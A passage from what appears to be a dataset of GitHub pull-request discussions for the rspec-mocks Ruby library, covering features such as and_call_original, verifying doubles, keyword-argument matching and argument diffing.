chained `with_original_method`."", ""> I think I agree. I think my favorite so far is the chained with_original_method.\n\nIf backwards compatibility weren't a concerned, would you still prefer this over simply always yielding the original method to the implementation block as the first argument?\n\nI like the `with_original_method` idea OK but mostly because it seems necessary to keep backwards compatibility.  If we go with one of the new syntaxes discussed in #153, I think I'd prefer to just make the implementation blocks always receive the method arg when used with that syntax."", ""> If backwards compatibility weren't a concerned, would you still prefer this over simply always yielding the original method to the implementation block as the first argument?\n\nMy gut reaction is yes I would still prefer it because calling through to the original method seems like the less used case. In general when I'm stubbing, I don't need to call through. Is it more common than I think though?\n\nI feel like the backwards compatibility case is worth considering too. Even if it were made in a major release bump, I feel like breaking changes should still be made very carefully. It seems like it might be frustrating to a lot of folks if the behavior of `stub` with a block changed in what arguments were yielded.\n\nThat said, if calling through is more common than I seem to think, I'm willing to be convinced."", '> My gut reaction is yes I would still prefer it because calling through to the original method seems like the less used case. In general when I\'m stubbing, I don\'t need to call through. Is it more common than I think though?\n\nIt\'s uncommon now because there is no support for it yet :)\n\nWhen I first heard the term ""spy"", I incorrectly intuited it to mean ""observe when this method is called, but don\'t replace it."" That\'s the primary impetus for this feature.', ""> I feel like the backwards compatibility case is worth considering too. Even if it were made in a major release bump, I feel like breaking changes should still be made very carefully. It seems like it might be frustrating to a lot of folks if the behavior of stub with a block changed in what arguments were yielded.\n\nAbsolutely.  I'm not advocating breaking backwards compatibility.  I can see I didn't explain myself very well.\n\nWhat I'm suggesting is that if we introduce a new rspec-mocks syntax, it affords us the opportunity to introduce other changes like these _without_ any risk of breaking backwards compatibility because no one is using the new syntax yet.\n\nSo, if we went with the `expect`/`allow` suggestion from that thread, you could do:\n\n``` ruby\nexpect(foo).to receive(:bar) { |orig_bar, some_arg|\n  something_before_original\n  orig_bar.call(some_arg)\n  something_after_original\nend\n```\n\n...but a block implementation with the existing syntax would not receive the method object:\n\n``` ruby\nfoo.stub(:bar) do |some_arg|\n  # no way to call original\nend\n```\n\nThis would not break backwards compatibility.  If we wanted to support this feature with the old syntax, the `with_original_method` chained method could be used when you're using the old syntax.\n\n> My gut reaction is yes I would still prefer it because calling through to the original method seems like the less used case. In general when I'm stubbing, I don't need to call through. Is it more common than I think though?\n\nIf you don't need to call through, it doesn't cause any problem to receive the extra block arg.  It can simply be ignored.\n  "", 'I can see that the logic in this discussion is mostly about decorating a method, so would it be more appropriate to name it `decorate`?\n\nAdditionally, I would like to suggest an alternative syntax for the simpler case where the user would like to stub the method for particular inputs, and otherwise fallback to the original behavior. I am thinking of something along the following lines:\n\n```ruby\ndef stub_with_fallback(obj, method)\n  original_method = obj.method(method)\n  obj.stub(method).with(anything()) { |*args| original_method.call(*args) }\n  return obj.stub(method)\nend\n\n# usage example:\nstub_with_fallback(File, :exist?).with(/txt/).and_return(true)\n```\n(Code copied from [my answer](http://stackoverflow.com/a/12536564/41283) on StackOverflow)\n\nIt should be simple to provide such a method while keeping backward compatibility. What do you think?', ""I like `decorate` quite a bit.  My main concern there is that there are cases where you want to do this with a stub and other cases where you want to do it with a mock...and having one method (`decorate`) doesn't make it easy to distinguish without some messy options.  I'd prefer to integrate it directly in the main mocking/stubbing syntax."", 'I would also like something along the lines of:\r\n\r\n``` ruby\r\nsomething.should_receive(:foo).and_call_original\r\n```\r\n\r\nThis would allow just checking invokation without ending up in an seemingly endless chain of mocks.', ""I'm going to try to get this in the next release.  Here's the direction I'm planning on taking...\r\n\r\n* `yield_original_method` will be added to the fluent interface.  When you provide a block implementation after calling this, the block will receive the original method object as the first argument.  This allows you to do things like change the arguments before passing them on to the original implementation.  At first, I was planning on calling this `with_original_method`, but we already have `with` on the fluent interface and this means something quite different.\r\n* `and_call_original` will be added for @rkh's case.\r\n\r\nOne question: what should it do if `yield_original_method` is used but no block implementation is provided?  Maybe `yield_original_method` should require a block, and should raise an error at the point it's called if none is provided?  If we go that direction, this would work:\r\n\r\n``` ruby\r\nobj.stub(:bar).with(3).yield_original_method { }\r\n```\r\n\r\n...but this would raise an error:\r\n\r\n``` ruby\r\nobj.stub(:bar).yield_original_method.with(3) { }\r\n```\r\n\r\n...which I think is OK.  Thoughts?\r\n\r\nOne other thing I'm toying with: adding a config option that would make rspec-mocks _always_ yield the original method to block implementations.  It'll default to off for backwards compatibility, and `yield_original_method` is provided for that case so that you can use it on one stub w/o needing to change the global config for the whole project and potentially break things.  In RSpec 3 we can consider defaulting it to on.\r\n\r\nGood idea or bad idea? "", '@myronmarston I actually think `yield_original_method` is going to be very confusing for ppl and is probably not necessary if we have `and_call_original` (which solves the real problem IMO).', ""`and_call_original` is perhaps the common case, but it's far less flexible than `yield_original_method` would be.  I've had cases in the past where having `yield_original_method` would have come in handy, but I've been able to work around it using something like:\r\n\r\n``` ruby\r\norig_method = obj.method(:foo)\r\nobj.stub(:foo) do |arg|\r\n  if arg == :blah\r\n    17\r\n  else\r\n    orig_method.call(arg)\r\n  end\r\nend\r\n```\r\n\r\n...so I've gotten by without before now, but I like the full flexibility `yield_original_method` would afford.  Why do you think it would confuse people?"", ""Because it's a different block API - other uses of the block only get the submitted args as block args, whereas this one method gets an additional block arg. To me, that violates principle of least surprise."", '> Because it\'s a different block API - other uses of the block only get the submitted args as block args, whereas this one method gets an additional block arg. To me, that violates principle of least surprise.\r\n\r\nHmm, I get your point, although given that the method is explicitly saying ""yield the original method, too"", it doesn\'t seem like it would be surprising (you\'ve just told rspec-mocks to do that....).\r\n\r\nWhat do you think about the config option instead?', '>> Hmm, I get your point, although given that the method is explicitly saying ""yield the original method, too""\r\n\r\nBut it also yields the args, not just the original method, right? So the name doesn\'t really tell the whole story, and I don\'t want to type \'yield_original_method_and_submitted_args\'.\r\n\r\nPersonally, I think the last example you gave as a workaround is perfectly expressive and we should document that and recommend it as a solution to that problem.', 'I just pushed a first-pass implementation for this.  A few random thoughts/questions:\r\n\r\n* To get this to work, I had to change the `MessageExpectation` initializer so that it receives the `MethodDouble` as an argument.  This was necessary so that `and_call_original` could query the method double for the original method.  This increases the coupling between `MessageExpectation` and `MethodDouble` a bit (`MessageExpectation` used to know nothing about `MethodDouble`).  Anyone got any ideas how to achieve this behavior w/o increasing this coupling?\r\n* This turned out to be more complex than I expected, so I commented `MethodDouble#original_method` pretty heavily (even though I usually favor self-explanatory code that needs no comments).  Is this overkill or helpful?\r\n* There are a couple different ways we can handle `method_missing`.  On 1.9, w/ a well-behaved object that defines `respond_to_missing?`, we\'re able to get a method object for a method_missing-handled message, but in other cases I thought it still valuable to try to handle the `method_missing` case as close to how the original object does as possible.  If the object does not define method_missing I have it giving early ""your object does not implement that message"" feedback from `and_call_original`, but otherwise, I try to use `method_missing` in case the object does handle the message.  The result is that there is a slight inconsistency: if an object defines `method_missing` but doesn\'t handle a particular message (e.g. because it `super`s for particular messages), `and_call_original` will not complain, and the user will get a `NoMethodError` when the message is received...but for an object that does not define `method_missing`, they\'ll get an immediate error when `and_call_original` is called.  Is this OK or is there a better behavior here?\r\n* I think that `and_call_original` only makes sense on partial mock objects, so I made it raise an error when used on a pure mock object, even if it\'s a message the mock object responds to (e.g. `object_id`, `to_s` or something basic like that).\r\n\r\nFeedback wanted!', ""I found something very, very odd...on 1.8.7, I got a strange failure when the specs ran in a particular order.  For some reason, declaring a test double and calling `should be_null_object` on it changes the class of error that gets raised from `NoMethodError` to `NameError`....which makes absolutely no sense to me.  I copied the snippet from another test over to consistently trigger the bug but I don't plan to merge that commit."", ""I've seen something similar in Rubinius, but can't be sure it's definitely related: https://github.com/rubinius/rubinius/issues/1938""]"
594,rspec/rspec-mocks,738.0,An attempt to improve the clarity of the documentation for using verifying doubles with dynamic classes.,"['See #737 for origin and see ping @xaviershay ', 'LGTM, this is clearer than what is there currently.', 'LGTM as well.', 'I cherry picked this to `3-0-maintenance` if you want to publish them @myronmarston ', '> I cherry picked this to 3-0-maintenance if you want to publish them @myronmarston\r\n\r\nDone.']"
595,rspec/rspec-mocks,726.0,"These specs fail:

```
Failures:

  1) verifying doubles instance doubles when doubled class is loaded for a method that accepts a mix of optional keyword and positional args allows hash matchers like `hash_including` to be used in place of the keywords arg hash
     Failure/Error: expect(o).to receive(:mixed_args_method).with(1, 2, hash_including(:optional_arg_1 => 1))
       Wrong number of arguments. Expected 2, got 3.
     # ./spec/rspec/mocks/verifying_double_spec.rb:263:in `block (5 levels) in <module:Mocks>'
     # /Users/myron/code/rspec-dev/repos/rspec-core/exe/rspec:4:in `<top (required)>'

  2) verifying doubles instance doubles when doubled class is loaded for a method that only accepts keyword args allows hash matchers like `hash_including` to be used in place of the keywords arg hash
     Failure/Error: expect(o).to receive(:kw_args_method).with(hash_including(:required_arg => 1))
       Missing required keyword arguments: required_arg
     # ./spec/rspec/mocks/verifying_double_spec.rb:255:in `block (5 levels) in <module:Mocks>'
     # /Users/myron/code/rspec-dev/repos/rspec-core/exe/rspec:4:in `<top (required)>'
```

The problem is that our method signature logic treats a `Hash` as keyword args but does not treat hash matchers the same:

https://github.com/rspec/rspec-support/blob/1e52a1ff545f9042fcc3c06d3febf2873defc4e6/lib/rspec/support/method_signature_verifier.rb#L61

Not sure what a good solution is yet.  Bringing it up for discussion.

/cc @xaviershay","['will look over the weekend.', ""Just dumping some thoughts:\r\n\r\n1. Do we let people use the `anything` matcher for keyword arguments? I'm leaning towards no just because I would never let it through a code review. If we do allow it, then either:\r\n  1. it disables verification\r\n  2. we do verification on message receive\r\n2. Though actually the `include` matcher is the same, because it's effectively just as opaque as anything.\r\n3. To make this work, we'd have to defer method signature verification until the message is received. Looks like `message_received` is already an API on proxy objects though, so could maybe just add there?\r\n4. Potentially need to add new state to `MethodSignatureVerifier`? See rspec-support PR.\r\n5. Need an API for detecting matchers so we don't introduce circular dependency (or terrible code) to rspec-support.\r\n\r\nHave added some terrible code on this branch that fixes the problem, need to figure out if there is a better way."", ""Somehow I missed your questions above before.  Some of this is repeating myself from the thoughts I shared on the rspec-support PR, but for completeness sake, here are my responses:\r\n\r\n> Do we let people use the anything matcher for keyword arguments? I'm leaning towards no just because I would never let it through a code review.\r\n\r\nIMO, it would be very confusing for `anything` to mean `anything_except_x` for any value of x.  `anything` should mean literally anything, so we should allow it.  I also don't think it's necessarily bad; when the only detail you care to specify is some other argument, it can be quite handy, and being able to specify only the details you care about is essential to writing non-brittle tests.\r\n\r\n> If we do allow it, then either:\r\n> it disables verification\r\n> we do verification on message receive\r\n\r\nWe already do verification when the message is received.  Given that, allowing matchers like `anything` to be used doesn't actually weaken the guarantees of verified doubles.\r\n\r\n> Though actually the `include` matcher is the same, because it's effectively just as opaque as anything.\r\n\r\nI think it's quite reasonable to use `a_hash_including` to specify only the details you care about, which is an alias of `include`.\r\n\r\n> To make this work, we'd have to defer method signature verification until the message is received. Looks like message_received is already an API on proxy objects though, so could maybe just add there?\r\n\r\nAs I said, we already do verification when the message is received.  We decided to do it for both `with` and when the message is received because they can catch different cases.  For example, `instance_double(MyClass, :foo => 13)` stubs `foo` but hasn't used `with` so no verification is applied at that point.  When the `foo` message is received it will verify.  OTOH, it's still useful to verify on `with` because of cases like `expect(x).not_to receive(:foo).with(...)` -- there will not be a time when the message is received so we still want to verify `with`.\r\n\r\n> Potentially need to add new state to MethodSignatureVerifier? See rspec-support PR.\r\n\r\nI think we need to add an alternate verification API that allows any matcher to pass the keyword arg verification (when a matcher is passed as the last arg in place of keyword args), and yes, this might involve some extra state.\r\n\r\n> Need an API for detecting matchers so we don't introduce circular dependency (or terrible code) to rspec-support.\r\n\r\nThere's a start of that here:\r\n\r\nhttps://github.com/rspec/rspec-expectations/blob/3817dc9846c0d80493804a820e1a6fea28d630eb/lib/rspec/matchers.rb#L922-L929\r\n\r\nI shared some additional thoughts on the rspec-support PR about where to go with that."", ""> > Do we let people use the anything matcher for keyword arguments? I'm leaning towards no just because I would never let it through a code review.\r\n\r\n> IMO, it would be very confusing for `anything` to mean `anything_except_x` for any value of x.  `anything` should mean literally anything, so we should allow it.  I also don't think it's necessarily bad; when the only detail you care to specify is some other argument, it can be quite handy, and being able to specify only the details you care about is essential to writing non-brittle tests.\r\n\r\nI agree here, `anything` needs to be 'anything', I too wouldn't use this personally but I can see why it's useful and having it mean anything follows the principle of less surprise here.\r\n\r\n> > If we do allow it, then either:\r\n> > it disables verification\r\n> > we do verification on message receive\r\n\r\n> We already do verification when the message is received.  Given that, allowing matchers like `anything` to be used doesn't actually weaken the guarantees of verified doubles.\r\n\r\n`anything` still provides verification, as we don't ever verify type anyway, just numbers of arguments.\r\n\r\n> > Though actually the `include` matcher is the same, because it's effectively just as opaque as anything.\r\n\r\n> I think it's quite reasonable to use `a_hash_including` to specify only the details you care about, which is an alias of `include`.\r\n\r\nI started on keyword argument matchers a while back, I'm not sure I like using `a_hash_including` here because it isn't a hash."", '@myronmarston PTAL\r\n\r\nRequires https://github.com/rspec/rspec-support/pull/89', 'Addressed feedback.', 'LGTM.']"
596,rspec/rspec-mocks,762.0,"This probably needs more specs and needs features but this converts `and_call_original` into `and_wrap_original` then uses `and_wrap_original` to implement the old `and_call_original` (thus nicely proving it works!).

Closes #650.","['Thanks, @JonRowe, I plan to review this in the morning.', 'The implementation looks great.  I agree that it needs to have specs/cukes fleshed out more and it needs a changelog entry.', 'Ping, added some specs and a feature.', '@myronmarston I addressed your feedback, waiting for travis though', 'Needs a changelog, then merge away once green.']"
597,rspec/rspec-mocks,770.0,Closes #702.,"[""This is green and I'd like to include this in 3.1...otherwise we're liable to have merge conflicts when backporting bug fixes from master to 3-1-maintenance.\r\n\r\nAnyone want to review this?\r\n\r\n/cc @JonRowe @samphippen @soulcutter @cupakromer @xaviershay @yujinakayama "", 'In general LGTM. Left a few comments / questions. None are merge blockers.', ':+1: merge when green']"
598,rspec/rspec-mocks,751.0,"Related #434. This uses the differ that is now in RSpec support to
perform argument diffing when arguments don't match.

Things worth noting/still to do:

* Special case behaviour needs to be added for the no arguments matcher
  and the any arguments matcher, at the moment something like this:
```
       @@ -1,2 +1,2 @@
       -[#<RSpec::Mocks::ArgumentMatchers::NoArgsMatcher:0x000001024ec728>]
       +[{:bees=>:foo}]
```
  gets printed, and that's obviously not great.
* Need to work out what to do in the ""similar args"" case where there are
  potentially multiple calls. I think the best thing to do would be to
  would be to only diff if there's one call. (@myronmarston maybe has thoughts?)

There's some refactoring that could be done here but I want to finish
implementing the ""similar args"" implementation before I do that so that
I'm sure that I'm refactoring the right thing.

Also: needs more specs.","['Looks fairly simple, nice :)', '> Special case behaviour needs to be added for the no arguments matcher and the any arguments matcher, at the moment something like this:\r\n>        @@ -1,2 +1,2 @@\r\n>        -[#<RSpec::Mocks::ArgumentMatchers::NoArgsMatcher:0x000001024ec728>]\r\n>        +[{:bees=>:foo}]\r\n> gets printed, and that\'s obviously not great.\r\n\r\nCan\'t this use the `description` of the arg matcher?\r\n\r\n> Need to work out what to do in the ""similar args"" case where there are potentially multiple calls. I think the best thing to do would be to would be to only diff if there\'s one call. (@myronmarston maybe has thoughts?)\r\n\r\nHmmm...I\'d have to see example output from the different options before forming an opinion.  Overall, I\'d say I\'d err on the side of only adding diffing to places where it definitely makes sense; we can always add additional diffing later in the future.', ""I'm gonna be trying to finish this off over the coming weekend \\o/"", 'I think you also need to add `diff-lcs` as a runtime dependency of rspec-mocks.', ""Yep, if we're using the differ from support."", 'I added some specs with output. @myronmarston @JonRowe got thoughts?', ""Looks good to me, except it doesn't seem to work on `1.8.7`?"", ""1.8.7 is ordering the hashes differently. I'll take a look at it when I get the chance."", ""It's moaning about objects too isn't it? Also on `1.8.7` hashes aren't ordered, we deal with that somewhere by generating the string from the hash so the ordering is the same."", ""I can't get this to fail locally on 1.8.7"", 'Yolo pushed a fix.', 'Hey it passed!', ""1.8.7 doesn't like your last commit again :/"", ""I had a look locally but I didn't get anywhere concrete. Going to try again tomorrow."", ""@myronmarston good point. I'll do that :) "", ""I'm having some trouble debugging this 1.8.7 failure but I'm going to give it another stab on my upcoming **holiday** (first one in 9 months I am so excite)"", 'I kicked the build and left a couple comments.', '@samphippen where are you at on this? My 3.1 blog post is almost ready...', ""@myronmarston I'm gonna get this done today whilst travelling to berlin."", ""Gonna have to fix a bunch of rubocop violations now that I've merged master into this."", ""I can't reproduce this jruby failure locally, can anyone take a look at it?"", ""At this point, I think I'm just going to go ahead and release 3.1 today without this...it can be a 3.2 feature.  OK?"", 'No problem :)', '@myronmarston I think this addresses most of the feedback you left. Please let me know what you think :heart: ', ""There's a lot of commits here; can they be squashed together into one?  I don't see value in keeping them separate.\r\n\r\nAlso, does this fix #685 (my impression without looking very deep into it is that it does)?  If so, it would to add a spec specifically for the bug for that issue to prevent future regressions and include it in the changelog.\r\n\r\nActually, if you go that route, it'd be good to make the fix for #685 be one commit (the first commit) and then your diff changes be a second commit."", ""After a mildly complex rebase, I think I've nailed it. Let me know what you think ^_^"", 'Green :sparkles: ', ""> After a mildly complex rebase, I think I've nailed it. Let me know what you think ^_^\r\n\r\nMuch better :).  I'm done with my review based on looking at the PR.  Left a few more comments.\r\n\r\nOne other thing I plan to do later today (don't have time right now) is check out this branch and play with it a bit to make sure the formatting of the diff looks good--that's the kind of thing that's hard to tell from the specs."", ""OK, I tried out the diffing locally and I'm pretty happy with how it looks, except for the lack of a `Diff:` label, which we already discussed."", ""@samphippen -- where is this at?  I noticed you pushed some more commits (but I didn't realize that until just now and haven't looked at them), but this is red and unmergable.  It would be good to get this in soon :).""]"
599,rspec/rspec-mocks,863.0,This expands the documentation of the objects now exposed to the public via #832 /cc @myronmarston ,"['Not consistent about ending documentation with a period or not.', 'Fixed :P', 'Re-review @myronmarston ?', ""I've got a couple of small quibbles but it'll honestly be easier to just make the changes myself.  I'll push them to this PR shortly, if that's OK with you."", 'Sure!', ""OK, I pushed my changes.  A few things to note.\r\n\r\n* I was surprised there wasn't a spec change when you changed `target` from `@object.class` to `@object`.  I discovered why in 7478671ecd12af18fb37cd0e273f7823931ad3ac...`have_attributes(:target => Object)` will pass an object that returns `Object` from `#target` or that returns an instance of `Object` from `#target`, because our composable matching logic uses `===` and `Object === any_object` is true.  In the future, if you want to specify that it must be the `Object` class (and not an instance), you could use `have_attributes(:target => eq(Object))` (or an alias of `eq`).  Regardless, I updated the spec to force it to be the object instance since that's what we want now.\r\n* It's easy to make small mistakes with YARD that don't render properly.  For example, when you forget to wrap types in square brackets (as you did in several places) it doesn't interpret it as a type.  I make these mistakes sometimes, too.  My suggestion (and what I do) is to run `bin/yard server --reload` and to view the docs in the browser as you edit -- that way you're aware of how YARD renders it and not blindly trusting that you've written the syntax in the way that it expects.  It's basically like using TDD for docs in tems of instant feedback :)."", 'Noted; So are you happy with this now?', 'Yes', 'Merged.']"
600,rspec/rspec-mocks,936.0,"This was allocating linear hashes per mock. Now it allocates at most
one in the execution of the whole test suite, the default hash is a
constant.

WIP, but here's an initial optimisation. I'll do as many as I can and get this cleaned up by the end of next weekend.","['HT @mrgilman for giving me a hand with this.', 'LGTM. Mind squashing it?']"
601,rspec/rspec-mocks,277.0,"In the process of fixing #276 I discovered that the test checking that `allow_message_expectations_on_nil` was actually isolated per example wasn't being run.

So this makes that test run and then fixes the problem by moving the reset of the warning from MethodDouble to Proxy (which is where nil is being forcibly registered each time we enable it)","[""Refactored to remove global state (thanks to @myronmarston's input) and rebased."", ""Nice work, Jon :).  Sorry about not being more clear about my suggestions here before...I'm glad you figured it out, though!"", 'Thanks, Jon!']"
602,rspec/rspec-mocks,974.0,"It seemed to me that if the problem is creating superclass proxies, then we could just add a method and put a flag in to the constructors to fix this. The current fix is a bit shonky, but demonstrates the solution.

I have some questions/thoughts:

1. Perhaps, this behaviour change should be extracted out in to an object, as opposed to a conditional. We'd inject a callbacks collaborator into the proxies which they would then invoke
2. Perhaps this should be flag on proxy_for instead of adding a new method?
3. I think the verifying class proxy is the only place we need to put the flag, but is that correct?

This fix is *really simple*, but I'm not sure it's architecturally brilliant. Thoughts?","[""@myronmarston I'm happy with the state of this PR now. Any other comments, or shall I squash and merge on green?"", ""Haven't had a chancery do a full review yet. I'll take a look later today. "", 'LGTM :smiley_cat: I like the refactored approach. Left some minor comments, neither are merge blockers.', ""Thanks for coming up with a solution quickly, @samphippen!\r\n\r\nI'm a bit concerned that this increases the complexity of proxy instantiation considerably.  As I mentioned in #972, I don't think it's desirable for us to instantiate the superclass proxies at all.  It's merely an implementation detail of getting `original_method_handle_for` to look up the superclass chain--and now it's an implementation detail that is growing even more complex in this PR.  The fact that the instantiating superclass proxies caused a bug is, IMO, a hint that maybe we should look into an alternate implementation that avoids instantiating superclass proxies entirely.  I expect such a solution would _decrease_ complexity rather than increase it.\r\n\r\nThat said, this PR definitely fixes a bug that I'd like to get squashed soon, and merging this doesn't preclude us from doing the alternate solution in the future.  It may make such a future refactoring more difficult, though, and increase maintenance costs (as complexity tends to attract more complexity).  That's the main thing that's making me reticent to merge this as-is.\r\n\r\nThoughts?"", ""@myronmarston given this represents a real bug fix, I'd like to see it merged. I agree that aiming at reducing complexity is a good idea, but I don't think it should come at the cost of fixes. This also has behaviour that should be preserved after any refactorings.\r\n\r\nRegarding the strategy pattern situation: I'd rather not introduce a conditional if it can be avoided, I find conditionals breed like complexity. I'm happy to store individual instances of both strategy objects so that we don't have to make new ones each time."", ""Let's go with this fix."", ""There's another issue we've discovered with the way we invoke the callbacks for this case:\r\n\r\nhttps://github.com/rspec/rspec-core/issues/1994#issuecomment-112325603\r\n\r\nThis can still be merged but there may be more changes we want in this area.\r\n\r\n/cc @samphippen "", '@samphippen -- any reason for the delay on squashing and merging this?  Would be good to get a patch release out with the fix.', ""Done, sorry. @myronmarston what's a good changelog entry for this while we're waiting for CI?"", 'Trying to debug that jruby failure.', 'Cannot reproduce that failure locally.', '@myronmarston any thoughts on that one CI failure?', ""I can reproduce it.  The source of the failure is rspec/rspec-support#215.  Have you pulled the latest rspec-support?  I'm guessing your local checkout is out of date.\r\n\r\nThe source of the problem is that JRuby 1.8 mode does `pp` kinda weird, apparently, so the output you generate in the test here:\r\n\r\nhttps://github.com/rspec/rspec-mocks/blob/f7837f522072a890b7be7ad8f71b66eca3f18de9/spec/rspec/mocks/diffing_spec.rb#L148\r\n\r\n...differs from the output the differ generates via this line of code:\r\n\r\nhttps://github.com/rspec/rspec-support/blob/40e434d4b77065ea3f3fd98bcde10c4ed9a6f30c/lib/rspec/support/object_formatter.rb#L103\r\n\r\nI pushed a fix that makes `inspect` more determinstic."", '@myronmarston is this good to merge?', '> @myronmarston is this good to merge?\r\n\r\nYes, after we add a changelog entry (forgot to respond to your question about that yesterday...sorry!).  Maybe this?\r\n\r\n> Fix bug in `before_verifying_double` callback logic that caused it to be called once for class\r\n> in the ancestor list when mocking or stubbing a class. Now it is only called for the mocked or\r\n> stubbed class, as you would expect. (Sam Phippen, #974)', 'You can add that post-merge, though.\r\n\r\nAlso, please backport to 3-3-maintenance.']"
603,rspec/rspec-mocks,979.0,Part of a solution for rspec/rspec-core#1994,"['^^ @myronmarston ', 'You mind adding a spec for this?  Basically, if you write a spec that registers a `before_verified_double` callback that does something that causes a proxy to be accessed (e.g. stubbing a method) it should fail w/o this with the deadlock error and pass with it.', ""I'm not quite sure why 2.2 doesn't like this, it doesn't fail for me locally..."", ""> I'm not quite sure why 2.2 doesn't like this, it doesn't fail for me locally...\r\n\r\nIt fails only on ruby 2.2.0.  On later versions of 2.2.x it does not fail.  There was a new warning in ruby 2.2.0 that I [complained about](https://bugs.ruby-lang.org/issues/10661) and which was removed in later 2.2.x releases."", 'Updated to hopefully avoid the 2.2 bug', 'LGTM', ""Hmm, does this need a changelog, I mean it's technically an internal refactoring but also a bug fix..."", 'It is a bug fix, so I think so.  ', 'Hm, I think that #980 should get the changelog entry, and this is actually a refactoring of that for 3.4...']"
604,rspec/rspec-mocks,290.0,"`RSpec::Core` has support for logging deprecations to file, but `Mocks` wasn't using this to warn about deprecations, `Expectations` already defers to `Core` so let's make `Mocks` do so to.","[""I'm bringing this inline with the new message syntax and rebasing post #292"", ""Review @myronmarston? I've just pulled across the message stuff from core and merged my old code in with the new stuff."", ""It looks like @dchelimsky dealt with the same issues in #294.  (We need to find a way to communicate better so work isn't duplicated like this!)\r\n\r\nThe implementation in #294 seems cleaner/simpler (particularly the `deprecate` method).  Any objections to closing this and merging that one instead?\r\n\r\n@JonRowe -- thank you for contributing faithfully to RSpec.  Your work is appreciated even if it winds up not being merged due to miscommunication!"", 'No objection (especially as @dchelimsky has upgraded to the new mocks syntax :) :heart:) but there is still some relevant work here, mostly the require of deprecate, but I still value the spec and cleanup...']"
605,rspec/rspec-mocks,385.0,As described in #384 the way that original methods are stashed breaks the ability to stub the non-prepended method.,"['cc @alindeman Does this seem right to you? The fix definitely works, but maybe you have suggestions about the spec or implementation?', '\n[![Coverage Status](https://coveralls.io/builds/137008/badge)](https://coveralls.io/builds/137008)\n\nChanges Unknown when pulling **9636dc9a9d681a66d9d094522f3e9e8972029d7a on 384_stubbing_with_prepend** into ** on master**.\n', ""If you're happy with this it LGTM."", ""@soulcutter I'm totally happy with this, checked the branch out and gave it a little prod, so yeah, go ahead and merge it :smile: "", 'LGTM as well. Should we back port this to 2.14 and 2.99 as well?', ""I'm strongly in favour of pulling patches that are bugfix only all the way back, but I don't want to drop a release of 2-14 for every bugfix, what's a good guideline for when we drop a patchlevel?"", ""I think there's a couple of patches lying in the `2-14-maintenance` branches, and they tend to bunch, I think if we have a patch ready we should wait a week or so then release to bunch patches together and prevent us from releasing all the time? "", 'I back-ported this into 2-14-maintenance and 2-99-maintenance as well.', ""> I'm strongly in favour of pulling patches that are bugfix only all the way back, but I don't want to drop a release of 2-14 for every bugfix, what's a good guideline for when we drop a patchlevel?\r\n\r\nI've yet to hear a complaint about patch releases coming out too often, and the release process is automated enough that it's very light weight and quick.  My general rule of thumb is to release a patch release every time merge  a patch-worthy bugfix is merged into the old maintenance branch, unless there are other pending changes we expect to be merged into that branch in the near future...then I'll hold off until we get that stuff resolved.  But if there's nothing pending, I'll tend to just go ahead and cut a release.\r\n\r\nSpeaking of which...is there anything else that's pending for rspec-mocks 2.14 or should I go ahead and cut a patch release with this fix?"", '[Looks like this is the only thing pending in rspec-mocks 2.14](https://github.com/rspec/rspec-mocks/compare/v2.14.2...2-14-maintenance)']"
606,rspec/rspec-mocks,378.0,"This is intended to be both API compatible with [rspec-fire](https://github.com/xaviershay/rspec-fire), and to completely obsolete it. It does not yet implement any of the suggested changes in #227, such as transferring nested constants by default or an alternate constant stubbing interface.

It adds the following behaviours:

```
verifying doubles
  class doubles
    when doubled class is not loaded
      allows any method to be stubbed
    when doubled class is loaded
      can transfer nested constants to the double
      can replace existing constants for the duration of the test
      only allows class methods that exist to be expected
      only allows class methods that exist to be stubbed
      allows class to be specified by constant
  instance doubles
    when doubled class is not loaded
      allows any instance method to be stubbed
    when doubled class is loaded
      only allows instance methods that exist to be expected
      only allows instance methods that exist to be stubbed
      checks the arity of stubbed methods
      allows class to be specified by constant
  when verify_constant_names config option is set
    prevents creation of instance doubles for unloaded constants
    prevents creation of class doubles for unloaded constants
```

It adds a perhaps unexpected method to the public API: `ArityMatcher.match!`. This seemed useful enough on its own to make public, but I would consider keeping it private if anyone exists.

### Suggested reading order

If you are not familiar with `rspec-fire`, start with `features/verifying_doubles/README.md`. `lib/rspec/mocks/example_methods.rb` is the entry point for the feature. Trace that through until you find `lib/rspec/mocks/verifying_proxy.rb` which contains the bulk of the logic.

### Questions for reviewers

* I'm not familiar with yardoc style. Does this conform?
* What is the preferred way to split features over the `README` and actual cucumber files?
* It is unfortunate that I need to use a parallel class hierarchy for the verifying counterparts. Is there a better way to do this?

@myronmarston @jonrowe

Fixes #227.","['\n[![Coverage Status](https://coveralls.io/builds/126619/badge)](https://coveralls.io/builds/126619)\n\nCoverage increased (+0%) when pulling **42d08609f15fc6a567c5f6c9075c85fa102ebfda on xaviershay:issue-227** into **e6d19803585e0f8488f650a8fbc0057c6ec9751b on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/126622/badge)](https://coveralls.io/builds/126622)\n\nCoverage increased (+0%) when pulling **927ae296ff67663f33e4a3e96e5963fd5d98104d on xaviershay:issue-227** into **e6d19803585e0f8488f650a8fbc0057c6ec9751b on rspec:master**.\n', ""Looking good so far.  I need to go fold laundry but I'll come back later (or perhaps tomorrow) to read through and comment on the rest."", 'Currently this is failing for all our `1.8.7` compatible builds.', 'Thanks for the great feedback! Will address it all in the next couple of days.', '\n[![Coverage Status](https://coveralls.io/builds/128203/badge)](https://coveralls.io/builds/128203)\n\nCoverage increased (+0%) when pulling **9a8310cacc890f75800036ec50e77d4c44664db5 on xaviershay:issue-227** into **e6d19803585e0f8488f650a8fbc0057c6ec9751b on rspec:master**.\n', 'New commits are hiding an open discussion about naming of `verify_constant_names` option. Other suggestions (copied from old comments):\r\n\r\n* `verify_instance_and_class_double_names`\r\n* `verify_verifying_double_names`\r\n* `check_verifying_double_names`\r\n* `verify_misspelled_constant_names`\r\n* `verify_doubled_constant_names`\r\n* `verify_doubled_class_names`', '\n[![Coverage Status](https://coveralls.io/builds/128228/badge)](https://coveralls.io/builds/128228)\n\nCoverage increased (+0%) when pulling **b177ba403bae1f9538c94794f0ac8cd8d0f15e71 on xaviershay:issue-227** into **474e64300ffdcb25c3c32d25a00ca22bed2c57a5 on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/128229/badge)](https://coveralls.io/builds/128229)\n\nCoverage increased (+0%) when pulling **6ca30784c428c8e4e034ec6f418484301fdcbfe4 on xaviershay:issue-227** into **474e64300ffdcb25c3c32d25a00ca22bed2c57a5 on rspec:master**.\n', '1.8.7 is passing now.', '* `verify_instance_and_class_double_names`\r\n\r\nThis is OK.\r\n\r\n* `verify_verifying_double_names`\r\n\r\nI dislike. 